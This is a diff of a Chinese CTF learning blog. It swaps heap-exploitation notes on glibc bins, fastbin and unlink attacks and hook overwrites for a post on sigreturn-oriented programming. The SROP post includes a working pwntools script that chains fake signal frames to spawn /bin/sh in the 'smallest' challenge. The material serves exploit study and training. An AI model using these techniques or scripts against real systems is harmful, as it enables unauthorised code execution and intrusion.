@@ -108,24 +108,24 @@
 
 
 
-  <meta name="description" content="linux 堆管理  program-(free malloc)-heap allocator-(mmap,brk)-kernel  glic-ptmalloc2  主要结构：chunk,bin,arena  bins 管理空闲堆块  arena 记录分配信息  chunk –allocated/free  malloc 返回指向data的指针。  chunk size包含堆头部 对齐问题，siz">
+  <meta name="description" content="SROP(Sigreturn Oriented Programming)">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XMAN-pwn-2">
-<meta property="og:url" content="https://yuuoniy.github.io/2018/08/06/XMAN-pwn-2/index.html">
+<meta property="og:title" content="CTF | srop 利用">
+<meta property="og:url" content="https://yuuoniy.github.io/2018/09/19/pwn-srop/index.html">
 <meta property="og:site_name" content="尿尿">
-<meta property="og:description" content="linux 堆管理  program-(free malloc)-heap allocator-(mmap,brk)-kernel  glic-ptmalloc2  主要结构：chunk,bin,arena  bins 管理空闲堆块  arena 记录分配信息  chunk –allocated/free  malloc 返回指向data的指针。  chunk size包含堆头部 对齐问题，siz">
-<meta property="og:updated_time" content="2018-08-14T07:10:08.597Z">
+<meta property="og:description" content="SROP(Sigreturn Oriented Programming)">
+<meta property="og:updated_time" content="2018-09-21T12:11:20.737Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XMAN-pwn-2">
-<meta name="twitter:description" content="linux 堆管理  program-(free malloc)-heap allocator-(mmap,brk)-kernel  glic-ptmalloc2  主要结构：chunk,bin,arena  bins 管理空闲堆块  arena 记录分配信息  chunk –allocated/free  malloc 返回指向data的指针。  chunk size包含堆头部 对齐问题，siz">
+<meta name="twitter:title" content="CTF | srop 利用">
+<meta name="twitter:description" content="SROP(Sigreturn Oriented Programming)">
 
 
 
 
 
 
-  <link rel="canonical" href="https://yuuoniy.github.io/2018/08/06/XMAN-pwn-2/"/>
+  <link rel="canonical" href="https://yuuoniy.github.io/2018/09/19/pwn-srop/"/>
 
 
 
@@ -135,7 +135,7 @@
   };
 </script>
 
-  <title>XMAN-pwn-2 | 尿尿</title>
+  <title>CTF | srop 利用 | 尿尿</title>
   
 
 
@@ -326,7 +326,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://yuuoniy.github.io/2018/08/06/XMAN-pwn-2/">
+    <link itemprop="mainEntityOfPage" href="https://yuuoniy.github.io/2018/09/19/pwn-srop/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="yuuoniy">
@@ -343,7 +343,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">XMAN-pwn-2
+          <h1 class="post-title" itemprop="name headline">CTF | srop 利用
               
             
           </h1>
@@ -368,7 +368,7 @@
                 
               
 
-              <time title="Created: 2018-08-06 08:53:52" itemprop="dateCreated datePublished" datetime="2018-08-06T08:53:52+08:00">2018-08-06</time>
+              <time title="Created: 2018-09-19 16:49:01" itemprop="dateCreated datePublished" datetime="2018-09-19T16:49:01+08:00">2018-09-19</time>
             
 
             
@@ -385,7 +385,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-08-14 15:10:08" itemprop="dateModified" datetime="2018-08-14T15:10:08+08:00">2018-08-14</time>
+                <time title="Modified: 2018-09-21 20:11:20" itemprop="dateModified" datetime="2018-09-21T20:11:20+08:00">2018-09-21</time>
               
             
           </span>
@@ -399,10 +399,10 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/08/06/XMAN-pwn-2/#comments" itemprop="discussionUrl">
+                <a href="/2018/09/19/pwn-srop/#comments" itemprop="discussionUrl">
                 
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/08/06/XMAN-pwn-2/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2018/09/19/pwn-srop/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -410,7 +410,7 @@
 
           
           
-             <span id="/2018/08/06/XMAN-pwn-2/" class="leancloud_visitors" data-flag-title="XMAN-pwn-2">
+             <span id="/2018/09/19/pwn-srop/" class="leancloud_visitors" data-flag-title="CTF | srop 利用">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -435,7 +435,7 @@
                 
                   <span class="post-meta-item-text">Symbols count in article: </span>
                 
-                <span title="Symbols count in article">4.4k</span>
+                <span title="Symbols count in article">4.5k</span>
               
 
               
@@ -469,206 +469,121 @@
       
 
       
-        <h4 id="linux-堆管理"><a href="#linux-堆管理" class="headerlink" title="linux 堆管理"></a>linux 堆管理</h4><p>  program-(free malloc)-heap allocator-(mmap,brk)-kernel<br>  glic-ptmalloc2<br>  主要结构：chunk,bin,arena<br>  bins 管理空闲堆块<br>  arena 记录分配信息<br>  chunk –allocated/free<br>  malloc 返回指向data的指针。</p>
+        <p>SROP(Sigreturn Oriented Programming)<br><a id="more"></a></p>
+<h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><h3 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h3><p><code>32</code> 位的 <code>sigreturn</code> 的调用号为 <code>77</code>，<code>64</code> 位的系统调用号为 <code>15</code> </p>
+<p>过程：<br>推荐看 angelboy 的 ppt</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">x86</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x77</span></div><div class="line"><span class="keyword">int</span> <span class="number">0x80</span></div><div class="line">x64</div><div class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">0xf</span></div><div class="line"><span class="keyword">syscall</span></div></pre></td></tr></table></figure>
+<h3 id="利用要点"><a href="#利用要点" class="headerlink" title="利用要点"></a>利用要点</h3><ul>
+<li>利用 sigreturn ,构造 syscall</li>
+<li>控制所有寄存器</li>
+<li>控制 ip 和 stack</li>
+<li>需要足够的栈空间保存 signal frame</li>
+<li>直接伪造 sigcontext 结构，全部 push 进 stack</li>
+<li>将 ret address 设在 sigreturn syscall 的 gadget</li>
+<li>将 signal frame 中的 rip(eip) 设在 syscall</li>
+<li>sigreturn 回来后就会执行我们自己构造的 syscall</li>
+</ul>
+<h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><ul>
+<li>利用栈溢出控制栈内容</li>
+<li>相应的地址<ul>
+<li>‘/bin/sh’</li>
+<li>signal frame</li>
+<li>syscall</li>
+<li>sigreturn</li>
+</ul>
+</li>
+</ul>
+<h3 id="系统调用链"><a href="#系统调用链" class="headerlink" title="系统调用链"></a>系统调用链</h3><ul>
+<li>控制栈指针 rsp</li>
+<li>把原来 rip 指向的 <code>syscall</code> gadget 换成 <code>syscall;ret</code> gadget </li>
+</ul>
+<p>基本思路：首先构造一个 <code>fake signal frame</code> 写入内存中，将然后将 <code>RSP</code> 指向这段空间，再发送 <code>rt_sigreturn</code> 信号（ 利用 eax 和 syscall 调用 sigreturn  控制 <code>rax=15</code> 32位是 0x77）。此时，内核会将构造好的 <code>fake signal frame</code> 取出，恢复。恢复后类似于ROP的方式，为 <code>syscall</code> 调用 <code>execve</code> </p>
+<h3 id="Sigreturn-gadget"><a href="#Sigreturn-gadget" class="headerlink" title="Sigreturn gadget"></a>Sigreturn gadget</h3><ul>
+<li>x86<ul>
+<li>vdso &lt;= 正常的 syscall handler 也會使⽤這邊</li>
+</ul>
+</li>
+<li>x64<ul>
+<li>kernel &lt; 3.3<ul>
+<li>vsyscall (0xffffffffff600000) &lt;= 位置⼀直都固定</li>
+</ul>
+</li>
+<li>kernel &gt;= 3.3<ul>
+<li>libc &lt;= 正常的 syscall handler 也會使⽤這邊</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>利⽤ ROP 製造</li>
+</ul>
+<p><code>sigreturn</code> 的功能为 <code>push frame</code> 中的内容到寄存器。 <code>call sigreturn</code> 时，<code>esp</code> 肯定是指向 <code>frame</code> 之前的地址的第一个字节（首位的一些字节被覆盖也没事）。 <code>sigreturn_addr + str(frame)</code></p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="例子-smallest"><a href="#例子-smallest" class="headerlink" title="例子 smallest"></a>例子 smallest</h4><p>程序很简单，只有一条汇编<br>调用 read</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">public</span> start</div><div class="line">start           proc <span class="built_in">near</span>               <span class="comment">; DATA XREF:</span></div><div class="line"><span class="keyword">xor</span>     <span class="built_in">rax</span>, <span class="built_in">rax</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">400h</span>       <span class="comment">; count</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rsp</span>        <span class="comment">; buf</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span>        <span class="comment">; fd</span></div><div class="line"><span class="keyword">syscall</span>                 <span class="comment">; LINUX - sys_read</span></div><div class="line"><span class="keyword">retn</span></div></pre></td></tr></table></figure>
+<p>相当于调用 <code>read(0,$rsp,400)</code> 有栈溢出<br>思路：</p>
 <ul>
-<li>chunk size包含堆头部</li>
-<li>对齐问题，size 低三位恒为0 用作标志位<ul>
-<li>N:是否thread arena</li>
-<li>M:是否mmaped 分配</li>
-<li>P:前一个chunk 是否适用</li>
+<li>通过控制 <code>read</code> 读取的字符数来设置RAX寄存器的值，从而执行sigreturn</li>
+<li>通过 <code>syscall</code> 执行 <code>execve(&quot;/bin/sh&quot;,0,0)</code> 来获取shell。</li>
 </ul>
+<p>自己还写不出 exp，根据 ctf-wiki 的调一下，写出自己的理解。</p>
+<p>有两种方法：</p>
+<ol>
+<li><p>利用 <code>syscall</code> 调用 <code>mprotect</code> 函数，将一段空间设置为RWX（可读可写可执行），然后将 <code>shellcode</code> ）写到这段空间中去，控制程序执行流跳转执行<br>首先利用 bof 布置  <code>mprotect</code> 的 <code>frame，利用</code> rop 回到程序开头置。根据 read 函数，控制 rax 的值来调用 <code>syscall</code> 实现 sigreturn，完成 mprotect 功能（利用 <code>syscall;retn</code> 和 rsp 实现 <code>syscall chain</code> 返回程序起始位置）。再读入 shellcode 执行即可。</p>
 </li>
-<li><p>pre_size:前一个相邻块大小</p>
+<li><p>常规 SROP，在 stack 中读入 <code>&#39;/bin/sh&#39;</code><br>说下2.</p>
+</li>
+</ol>
 <ul>
-<li>前一个块free时有意义</li>
-<li>前一个块allocated时可以空间复用为数据空间。</li>
+<li>泄露地址是必要的，可以利用 <code>write</code> 函数。需要写入<code>&#39;/bin/sh&#39;</code>, <code>write</code> 系统调用号为1，所以绕过 <code>xor rax,rax</code> 刚好使调用号为 1.</li>
+<li>构造 <code>frame</code>, 最后调用 <code>sigreture</code> </li>
 </ul>
-</li>
-<li><p>free chunk</p>
+<h3 id="地址泄露脚本"><a href="#地址泄露脚本" class="headerlink" title="地址泄露脚本"></a>地址泄露脚本</h3><p>问题：</p>
+<ol>
+<li>为什么一开始要布置 main_addr*3? 不直接设置为 main_addr+3?<br>rsp rbp 返回地址?</li>
+</ol>
+<ol>
+<li>为什么这样可以修改返回地址？<br>泄露的是buf地址，也就是rsp ,那么最多存储16个字节？？<br>buf在栈上，构造rsp 指向我们泄露的地址，其实不是很理解…<br>哪里设置 rax = 15 了。。。<br>主要不明白 这里<br><code>payload = p64(start_addr) * 3</code> 这里是要满足什么条件？<br><code>p64(start_addr) + &#39;a&#39; * 8 + str(sigframe)</code> ？<br>本地跑不通呀？？ 把 rsi 也设置为 stack_addr！！！就可以了<br>为什么 不设置 context.log_level=’debug’ 泄露地址就会出现错误： 那是因为程序写错了吧…<br>可是真的关了就错了…?? 为什么…</li>
+</ol>
+<p>payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level=<span class="string">'debug'</span></div><div class="line">context.arch = <span class="string">'amd64'</span></div><div class="line">p = process(<span class="string">"./smallest"</span>)</div><div class="line"></div><div class="line">main_addr = <span class="number">0x4000b0</span></div><div class="line">sys_addr = <span class="number">0x4000be</span></div><div class="line"></div><div class="line">payload = p64(main_addr)*<span class="number">3</span></div><div class="line">p.send(payload)</div><div class="line">p.send(<span class="string">'\xb3'</span>)</div><div class="line">stack_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</div><div class="line"></div><div class="line">log.success(<span class="string">"leak stack addr:"</span>+hex(stack_addr))</div><div class="line"></div><div class="line">sigframe = SigreturnFrame()</div><div class="line">sigframe.rax = constants.SYS_read</div><div class="line">sigframe.rdi = <span class="number">0</span></div><div class="line">sigframe.rsi = stack_addr</div><div class="line">sigframe.rdx = <span class="number">0x400</span></div><div class="line">sigframe.rsp = stack_addr</div><div class="line">sigframe.rip = sys_addr </div><div class="line">payload = p64(main_addr)+<span class="string">'a'</span>*<span class="number">8</span>+str(sigframe)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">sigreturn = p64(sys_addr)+<span class="string">'b'</span>*<span class="number">7</span></div><div class="line">p.send(sigreturn)</div><div class="line"></div><div class="line">sigframe = SigreturnFrame()</div><div class="line">sigframe.rax = constants.SYS_execve</div><div class="line">sigframe.rdi = stack_addr + <span class="number">0x200</span></div><div class="line">sigframe.rsi = <span class="number">0x0</span></div><div class="line">sigframe.rdx = <span class="number">0x0</span></div><div class="line">sigframe.rsp = stack_addr </div><div class="line">sigframe.rip = sys_addr </div><div class="line">frame_payload = p64(main_addr)+<span class="string">'b'</span>*<span class="number">8</span>+str(sigframe)</div><div class="line"></div><div class="line"><span class="keyword">print</span> len(frame_payload)</div><div class="line">payload = frame_payload+(<span class="number">0x200</span>-len(frame_payload))*<span class="string">'\x00'</span>+<span class="string">'/bin/sh\x00'</span></div><div class="line">p.send(payload)</div><div class="line">p.send(sigreturn)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p><a href="http://p6cwaqxnz.bkt.clouddn.com/smallest-leak-2.png" target="_blank" rel="external">leak</a></p>
+<h4 id="pwnable-kr-unexploitable"><a href="#pwnable-kr-unexploitable" class="headerlink" title="pwnable.kr unexploitable"></a>pwnable.kr unexploitable</h4><p>这道题的题解就看 pwnable.kr writeup 的博文吧</p>
+<h1 id="VDSO"><a href="#VDSO" class="headerlink" title="VDSO"></a>VDSO</h1><p>我们再来学一下 VDSO<br>主要是为了 syscall 指令 sysenter/sysexit</p>
 <ul>
-<li>fd:freelist中的 </li>
-<li>bk<br>相关数据结构</li>
-</ul>
+<li>提供 __kernel_vsyscall 來負責新型的 syscall</li>
+<li><p>提供 sigreturn ⽅便在 signal handler 結束後返回<br>user code </p>
 </li>
-<li>top chunk</li>
-<li>bins<ul>
-<li>fast bin<br>FILO，总共10bins, 每个bin中chunk大小一样 0x20-0x80(64bit) 包括头部的,0x10大小递增<br>仍被标记pre inuse位。不会进行合并。实际上最后三个bins并不使用</li>
-<li>unsorted bin<br>管理unsorted chunk。所有fast chunk之外的chunk被free时都会先放入unsorted bin<br>只有一个bin，FIFO。bin 中chunk大小不一样。双向循环链表</li>
-<li>small bins<br>0x20-0x400(64bit)0x10递增，62个bin ,每个bin中chunk大小一样 双向循环链表</li>
-<li>large bins<br>双向循环 FIFO。63bins,同一个bin中的chunk大小可以不一样，但在某个范围内。&gt;0x400 用到fd_nextsize,bk_nextsize</li>
-</ul>
-</li>
-<li>arana<ul>
-<li>管理bins。由主线程创建 main_arane,其他线程创建：thread_arena.arena数量有限 32：2*cores+1,64:</li>
-<li>malloc_state:fastbinY fastbin指针数组 Bins 除了fastbins 的指针数组</li>
-</ul>
-</li>
-<li>malloc 的操作：<ul>
-<li>计算真正的堆块大小：用户管理+堆头 </li>
-<li>在fastbin范围内？<ul>
-<li>是，检查对应的bin是不是有chunk<ul>
-<li>是，取bin的chunk</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>在small bin 范围？<ul>
-<li>是，对应的Bin有chunk<ul>
-<li>是，取chunk</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>unsorted bin有chunk?<ul>
-<li>有，从尾部去第一块，大小是否满足分配要求<ul>
-<li>是，剩余大小是否&gt;minsize(堆块头部大小))<br>-是，切分块，返回用户，把剩余chunk放回</li>
-<li>从unsorted 取下该块，不会切割</li>
-</ul>
-</li>
-<li>把这个块放到相应的small bin/large bin,遍历下一个块</li>
-</ul>
-</li>
-<li>unsorted bin 也不能满足要求<ul>
-<li>大小是否在large bin<ul>
-<li>是否有chunk<ul>
-<li>有,找到满足需求的最小chunk, 切分块(看生于大小）并返回，将剩余的块放入unsorted bin</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>large bin 分配失败<ul>
-<li>再次浏览所有的small/large bin 找到 best-fit chunk。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>top chunk</li>
-<li>系统调用扩大堆空间</li>
-</ul>
-</li>
-<li>free 操作<ul>
-<li>属于fast bin<ul>
-<li>是，直接加入对应fast bin，不改变下一堆块pre inuse标志位</li>
-</ul>
-</li>
-<li>是通过mmaped分配吗<ul>
-<li>是，用munmap回收</li>
-</ul>
-</li>
-<li>前一个相邻chunk是空闲的吗<ul>
-<li>和前一个堆块合并</li>
-</ul>
-</li>
-<li>后一个相邻chunk是top chunk?<ul>
-<li>是，和top chunk合并</li>
-</ul>
-</li>
-<li>后一个相邻chunk空闲？<ul>
-<li>合并</li>
-</ul>
-</li>
-<li>连入unsorted bin</li>
-</ul>
-</li>
-</ul>
-<h4 id="常见堆漏洞"><a href="#常见堆漏洞" class="headerlink" title="常见堆漏洞"></a>常见堆漏洞</h4><ul>
-<li>堆溢出<ul>
-<li>修改下一个堆块的size,标志位，fd/bk指针</li>
-<li>修改下一个对手的用</li>
-</ul>
-</li>
-<li>uaf<ul>
-<li>fd bk指针</li>
-</ul>
-</li>
-<li>double free<ul>
-<li>绕过glic中的检查。</li>
-</ul>
-</li>
-<li>unlink:<br>unlink<br>chunk overlap ：overwrite next chunk’s size=&gt;extend allacted chunk<br>overwrite next chunk’size=&gt;shrink free chunk<br>xx=&gt;extend free chunk</li>
-<li>off by one<ul>
-<li>改写下一个块的size</li>
-<li>改写下一个块的pre inuse位<br>chunk overlap ：</li>
-<li>overwrite next chunk’s size=&gt;extend allacted chunk</li>
-<li>overwrite next chunk’size=&gt;shrink free chunk</li>
-<li>xx=&gt;extend free chunk<h4 id="堆利用技巧"><a href="#堆利用技巧" class="headerlink" title="堆利用技巧"></a>堆利用技巧</h4><h5 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h5></li>
-<li>控制fd指针</li>
-<li>size 检查，链表头检查</li>
-<li>利用misalignment 伪造=&gt;0x7fxxxx</li>
-<li>overwrite GOT</li>
-<li>overwrite main_arena(always top chunk_ptr)</li>
-<li>overwrite realloc_hook/malloc_hook/free_hook (size 难伪造，but always infeasible)<h5 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h5></li>
-<li>任意地址写固定值 </li>
-<li><strong>控制bk指针</strong>，bk=addr-0x10 ，想要改写的地址值</li>
-<li>malloc 一个大小正好的堆块</li>
-<li>达到效果：addr=main_arena+0x58 ,转化为fastbin</li>
-<li>通常改写 global_max_fast</li>
-</ul>
-</li>
-</ul>
-<h5 id="small-bin-stack"><a href="#small-bin-stack" class="headerlink" title="small bin stack"></a>small bin stack</h5><ul>
-<li>伪造fake chunk,并让fake chunk 的fd 指向victim</li>
-<li>改写victim的bk为fake chunk</li>
-<li>则可以吧fake chunk 翻入对应的small bin</li>
-<li>下次malloc就可以分配到fake chunk<h5 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h5></li>
-<li>出现在从unsorted bin 放入large bin的过程</li>
-<li>吧large chunk 的 bk_next_size 改写成addr_A</li>
-<li>通过malloc 吧一个比当前（不满足</li>
-<li>addra+0x20 将被改写成victim指针</li>
-</ul>
-<p>freenote:防止与top chunk 合并</p>
-<p>伪造chunk p64(0x0)</p>
-<p>unlink:<br>地址 前面伪造fd  bk,-0x18</p>
-<h4 id="house-of-xx系列"><a href="#house-of-xx系列" class="headerlink" title="house of xx系列"></a>house of xx系列</h4><ul>
-<li><strong>house of spirit</strong><ul>
-<li>fa</li>
-</ul>
-</li>
-<li>house of force<ul>
-<li>overwrite top chunk’s size</li>
-<li>malloc arb</li>
-</ul>
-</li>
-</ul>
+<li><p>sysenter </p>
 <ul>
-<li><p>house of lore</p>
+<li>参数传递与 0x80 一样</li>
+<li>需要做 function prolog<ul>
+<li>push ebp;mov ebp ,esp </li>
+</ul>
 </li>
-<li><p>houser of roman<br>没有泄露<br>malloc hook </p>
+<li>stack pivot 的 gadget</li>
+</ul>
 </li>
 </ul>
-<p>例题<br>offbyone:<br>虽然我之前遇到好多次…但是一直觉得很难…一直放弃…听小姐姐讲的很清楚，所以决定还是好好调一调：<br>edit 函数有offbyone<br>需要时0x.8的格式，这样才会覆盖到pre_size<br>这道题的offbyone是比较宽松的。</p>
-<p>edit</p>
-<p>改写size域，扩大后面一个，堆块重叠，利用其中一个堆块对另一个堆块读写<br>泄露地址值，fast bin attack<br>puts \0 会被截断 如何打印fd指针？</p>
-<h1 id="note-1"><a href="#note-1" class="headerlink" title="note 1"></a>note 1</h1><h1 id="0x28-类型？"><a href="#0x28-类型？" class="headerlink" title="0x28 类型？"></a>0x28 类型？</h1><p>-0x170 </p>
-<p>切分成一部分 。unsorted bin 切分操作，让note2写入fd,bk指针 ，用show函数泄露<br>note 2 列入unsorted bin,存在 fd,bk指针，泄露main arana地址<br>vmmap<br>0x70 伪造成空闲的指针</p>
-<p>delete 3<br>delete 2 进入fast bin,修改note 5,即修改note2的fd </p>
-<p>fastbin attack<br>对size进行检查，只检查地32位。<br>one_gadget不好用-&gt;malloc_printf (k可以通过double free 触发，这样里面调用malloc函数) </p>
-<p>只能移除0byte ,缩小，<br>关键：控制fd指针，指向想要分配的地址值，uaf漏洞直接改写<br>free(1) free(2) free(1) ,即使malloc 又是 free,就可以改写<br>伪造chunk p64(0x0)</p>
-<p>pie:full relo:不能修改GOT,只能修改hook</p>
+<h2 id="return-to-vdso"><a href="#return-to-vdso" class="headerlink" title="return to vdso"></a>return to vdso</h2><p>直接利用 vdso 来做 ROP</p>
 <ul>
-<li>free_hook </li>
-<li>malloc_hook 改one_gadget          因为参数不能控制</li>
-<li><p>利用malloc_printer 实现one_gadget </p>
-<ul>
-<li>execve(“bin/sh”,rsp+50) 用malloc printer(在malloc,free中的错误检查) 函数内部又调用malloc</li>
+<li>gadgets:<ul>
+<li>x86<ul>
+<li>sysenter</li>
+<li>sysexit</li>
 </ul>
 </li>
-<li><p>非对齐的方式伪造size</p>
+<li>x64<br>有些版本的 kernel 可單靠 vdso 的 gadget 組成 execve</li>
+</ul>
 </li>
-<li>利用fast bin 在main arana 写size</li>
-<li>利用 fast bin 写 main arean 的size？</li>
 </ul>
-<p>函数名-检查 表</p>
+<p>libc 中提到：<br>    “On many architectures the kernel provides a virtual DSO and gives<br>   <strong>AT_SYSINFO_EHDR</strong> to point us to it. As this is introduced for new<br>   machines, we should look at it for unwind information even if<br>   we aren’t making direct use of it.  “</p>
+<p>  <strong>_rtld_global_ro</strong>：This variable is similar to _rtld_local, but all values are<br>   read-only after relocation.<br>找到 vdso 地址</p>
 <ul>
-<li>改写关键数据结构</li>
-<li>跳出 heap 范围</li>
-<li>构造 overlap chunk</li>
+<li>暴力</li>
+<li>地址泄露</li>
 </ul>
-<p>多调试看堆内存怎么分布。</p>
-<p>top chunk：<br>泄露heap起始地址(fast bin的fd 指向另外一个)<br>泄露Libc: 利用uaf,放入unsorted bin:fd bk写入libc中地址？。从<br>chunk3的fd指向 chunk4<br>top chunk的值size 变成system-1<br>top_ptr+free_hook_top_ptr=free_hook,写入system-1 top chunk标志位最后一位要是1，对执行整个system函数没有影响。<br>p &amp;<strong>free_hook</strong><br>main_arena &lt;—-&gt; symbols[‘__malloc_hook’]+0x10<br>note writeup:<br>note 在栈溢出<br>利用：利用栈溢出将覆盖v7为ptr指向的地址 ，同时利用一开始读取name，在ptr附近构造fake chunk size为0x70。之后对v7 free时就可以将ptr-0x10的地址加入fastbin。<br>new 一个长度为0x60的就会分配给他。并且地址是ptr的地址。将atoi_got写在ptr地址处，即ptr[0]=atoi_got通过show,就可以显示ptr[0]指向的内容，也就是atoi的地址。从而计算出libc基址，得到system地址。再通过edit函数修改ptr[0]指向的内容，即atoi_got指向system地址。</p>
-<p><a href="https://www.xctf.org.cn/library/details/8629b3304979199d7af6a4ad1bd94274c0a6a32a/" target="_blank" rel="external">https://www.xctf.org.cn/library/details/8629b3304979199d7af6a4ad1bd94274c0a6a32a/</a></p>
-<p>阅读源码<br><a href="https://bbs.pediy.com/thread-222718.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-222718.htm</a></p>
-<p>malloc_usable_size</p>
+<p><a href="http://p6cwaqxnz.bkt.clouddn.com/vdso-1.png" target="_blank" rel="external">vdso1</a><br><a href="http://p6cwaqxnz.bkt.clouddn.com/vdso-2.png" target="_blank" rel="external">vdso2</a><br>SROP 比ROP 的优势在于，ROP 需要用大量的 Gadgets 来完成寄存器的设置；而 SROP 只需要一块够大的内存空间，将 fake signal frame 部署到内存中即可。</p>
+<p>例题 defcon 2015 fuckup<br>vdso+srop<br>稍后再看…</p>
+<h2 id="相关资料："><a href="#相关资料：" class="headerlink" title="相关资料："></a>相关资料：</h2><p><a href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf" target="_blank" rel="external">slides</a></p>
+<p><a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html</a>   <a href="https://bestwing.me/2017/03/20/stack-overflow-three-SROP/" target="_blank" rel="external">https://bestwing.me/2017/03/20/stack-overflow-three-SROP/</a><br><a href="http://thinkycx.me/posts/20170429ichunqiu-pwn-smallest-writeup.html" target="_blank" rel="external">http://thinkycx.me/posts/20170429ichunqiu-pwn-smallest-writeup.html</a> 讲了利用 mprotect 的思路<br><a href="https://blog.csdn.net/qq_31481187/article/details/73929569" target="_blank" rel="external">https://blog.csdn.net/qq_31481187/article/details/73929569</a>   </p>
 
       
     </div>
@@ -696,18 +611,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/07/XMAN-pwn-3/" rel="next" title="XMAN-pwn-3">
-                <i class="fa fa-chevron-left"></i> XMAN-pwn-3
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/08/05/XMAN-pwn-1/" rel="prev" title="CTF | pwn 基础知识-栈溢出">
-                CTF | pwn 基础知识-栈溢出 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/09/15/format-string/" rel="prev" title="CTF | 格式化字符串漏洞">
+                CTF | 格式化字符串漏洞 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -937,7 +848,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#linux-堆管理"><span class="nav-number">1.</span> <span class="nav-text">linux 堆管理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常见堆漏洞"><span class="nav-number">2.</span> <span class="nav-text">常见堆漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#堆利用技巧"><span class="nav-number">3.</span> <span class="nav-text">堆利用技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#fastbin-attack"><span class="nav-number">3.1.</span> <span class="nav-text">fastbin attack</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#unsorted-bin"><span class="nav-number">3.2.</span> <span class="nav-text">unsorted bin</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#small-bin-stack"><span class="nav-number">3.3.</span> <span class="nav-text">small bin stack</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#large-bin"><span class="nav-number">3.4.</span> <span class="nav-text">large bin</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#house-of-xx系列"><span class="nav-number">4.</span> <span class="nav-text">house of xx系列</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#note-1"><span class="nav-number"></span> <span class="nav-text">note 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x28-类型？"><span class="nav-number"></span> <span class="nav-text">0x28 类型？</span></a></div>
